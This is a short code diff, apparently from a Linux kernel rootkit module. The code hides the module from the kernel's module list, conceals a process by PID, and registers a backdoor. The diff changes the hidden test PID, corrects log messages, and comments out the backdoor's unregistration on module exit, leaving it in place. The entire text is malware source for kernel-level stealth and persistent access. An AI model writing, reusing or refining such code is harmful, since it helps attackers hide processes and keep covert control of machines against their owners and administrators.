@@ -25,7 +25,7 @@ static void hide_module(void)
 	list_del_init(&(THIS_MODULE->mkobj.kobj.entry));
 }
 
-#define TEST_PID "2311"
+#define TEST_PID "6403"
 
 static int __init zl_init(void)
 {
@@ -40,15 +40,15 @@ static int __init zl_init(void)
 		return 0;
 	}
 	if (!hide_pid(TEST_PID))
-		log_err("cannot hide pid\n");
+		log_err("error hiding pid\n");
 	return 0;
 }
 
 static void __exit zl_exit(void)
 {
-	unregister_backdoor();
+	//unregister_backdoor();
 	if (!unhide_pid(TEST_PID))
-		log_err("erro unhiding pid\n");
+		log_err("error unhiding pid\n");
 	cleanup_procfs();
 	log_err("Unloading module\n");
 }
